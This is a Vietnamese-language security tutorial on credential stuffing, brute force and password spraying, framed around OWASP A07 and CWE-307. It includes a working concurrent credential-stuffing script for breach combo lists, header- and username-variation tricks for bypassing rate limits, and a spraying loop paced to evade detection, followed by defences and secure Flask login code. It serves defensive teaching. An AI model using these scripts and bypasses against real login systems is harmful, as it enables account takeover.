# Credential Stuffing & Brute Force

> **OWASP Top 10:2025**: A07:2025 – Authentication Failures | **CWE**: CWE-307 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

Credential stuffing và brute force là hai kiểu tấn công nhắm vào hệ thống xác thực bằng cách thử đăng nhập tự động hàng loạt. Sự khác biệt chính:

- **Brute Force**: Thử tất cả tổ hợp mật khẩu có thể (a, b, c... aa, ab...) hoặc từ wordlist phổ biến (dictionary attack).
- **Credential Stuffing**: Sử dụng danh sách username/password thật đã bị lộ từ các vụ data breach khác, lợi dụng thói quen tái sử dụng mật khẩu (password reuse) của người dùng.

Theo thống kê, khoảng 65% người dùng sử dụng cùng một mật khẩu cho nhiều dịch vụ. Khi một dịch vụ bị breach, toàn bộ tài khoản dùng chung mật khẩu đó đều bị đe dọa.

```python
# Normal login endpoint (simplified)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    if user and check_password_hash(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    
    # Generic error message (good practice)
    return render_template('login.html', error='Invalid credentials')
```

Endpoint trên hoạt động đúng cho từng request, nhưng nếu không có cơ chế giới hạn tốc độ (rate limiting), attacker có thể gửi hàng nghìn request mỗi phút để thử tổ hợp credentials.

## 🔍 Mô tả lỗ hổng

Lỗ hổng xảy ra khi hệ thống xác thực không giới hạn số lần đăng nhập thất bại, cho phép attacker tự động hóa việc thử hàng triệu tổ hợp username/password. Các biến thể bao gồm: brute force cổ điển, credential stuffing từ database bị lộ, password spraying (thử một mật khẩu phổ biến với nhiều username), và reverse brute force.

## ⚔️ Cơ chế tấn công

**1. Credential Stuffing với danh sách breach:**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Load leaked credentials from data breach
def load_credentials(filepath):
    creds = []
    with open(filepath) as f:
        for line in f:
            email, password = line.strip().split(':')
            creds.append((email, password))
    return creds

def try_login(cred):
    email, password = cred
    resp = requests.post('https://target.com/login', data={
        'username': email, 'password': password
    }, allow_redirects=False)
    
    # Check for successful login indicators
    if resp.status_code == 302 and '/dashboard' in resp.headers.get('Location', ''):
        print(f"[+] VALID: {email}:{password}")
        return (email, password)
    return None

# Test thousands of stolen credentials concurrently
creds = load_credentials('breach_combo_list.txt')
with ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(try_login, creds))
```

**2. Rate Limiting Bypass Techniques:**

```http
// Technique 1: IP rotation via headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

// Technique 2: Case variation to bypass username-based lockout
POST /login  → username=Admin@target.com
POST /login  → username=admin@target.com
POST /login  → username=ADMIN@target.com

// Technique 3: Add null bytes or whitespace
POST /login  → username=admin%00@target.com
POST /login  → username= admin@target.com
```

**3. Password Spraying — thử 1 mật khẩu cho nhiều user:**

```python
# Spray common passwords across many accounts
# Avoids per-account lockout thresholds
common_passwords = ['Password1!', 'Company2025!', 'Welcome1']
usernames = ['john.doe', 'jane.smith', 'admin', 'user1']

for password in common_passwords:
    for username in usernames:
        try_login((username, password))
        time.sleep(2)  # Slow down to avoid detection
```

## 🛡️ Biện pháp phòng thủ

1. **Rate limiting**: Giới hạn 5-10 lần thử mỗi IP mỗi phút, sử dụng token bucket hoặc sliding window algorithm.
2. **Account lockout**: Khóa tạm thời tài khoản sau N lần thất bại (progressive delay: 1 phút → 5 phút → 30 phút).
3. **CAPTCHA**: Yêu cầu CAPTCHA sau 3 lần thất bại liên tiếp.
4. **Breach password detection**: Kiểm tra mật khẩu mới đối chiếu với database breach đã biết (HaveIBeenPwned API).
5. **MFA enforcement**: Bật 2FA giúp credential stuffing trở nên vô hiệu ngay cả khi mật khẩu đúng.

## 💻 Code Example

```python
# VULNERABLE: no rate limiting, no lockout
@app.route('/login', methods=['POST'])
def login_unsafe():
    user = User.query.filter_by(username=request.form['username']).first()
    if user and check_password(user, request.form['password']):
        return login_user(user)
    # Attacker can try unlimited times
    return "Invalid credentials", 401
```

```python
# SECURE: rate limiting + progressive lockout + breach detection
from flask_limiter import Limiter
import hashlib, requests as req

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("10 per minute")  # IP-based rate limit
def login_safe():
    username = request.form['username']
    password = request.form['password']
    
    # Check if account is temporarily locked
    lockout = get_lockout_status(username)
    if lockout and lockout.locked_until > datetime.utcnow():
        remaining = (lockout.locked_until - datetime.utcnow()).seconds
        return jsonify({"error": f"Account locked. Retry in {remaining}s"}), 429
    
    user = User.query.filter_by(username=username.lower().strip()).first()
    if user and check_password(user, password):
        clear_failed_attempts(username)
        return login_user(user)
    
    # Progressive lockout: 3→1min, 6→5min, 10→30min
    failures = increment_failed_attempts(username)
    if failures >= 10:
        lock_account(username, minutes=30)
    elif failures >= 6:
        lock_account(username, minutes=5)
    elif failures >= 3:
        lock_account(username, minutes=1)
    
    return jsonify({"error": "Invalid credentials"}), 401
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/authentication/password-based
- OWASP: https://owasp.org/www-community/attacks/Credential_stuffing
- CWE: https://cwe.mitre.org/data/definitions/307.html
